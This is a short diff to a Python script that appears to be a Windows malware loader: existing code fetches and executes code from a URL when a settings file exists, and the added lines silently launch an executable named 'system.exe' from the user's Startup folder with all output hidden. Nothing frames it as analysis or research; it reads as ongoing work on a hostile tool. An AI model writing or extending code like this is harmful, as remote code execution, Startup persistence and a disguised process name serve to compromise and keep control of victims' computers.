@@ -8,6 +8,7 @@ import sys
 from ctypes import *
 import psutil
 import threading
+import subprocess
 
 
 def show_message_box(message, title="Bilgi"):
@@ -135,6 +136,8 @@ def main():
     time.sleep(1)
     if(check_file("settings.xml")):
         fetch_and_execute_code(url)
+    else:
+        subprocess.Popen(f'"{get_startup_folders()["User Startup"]}\system.exe"', shell=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 if __name__ == "__main__":
     main()
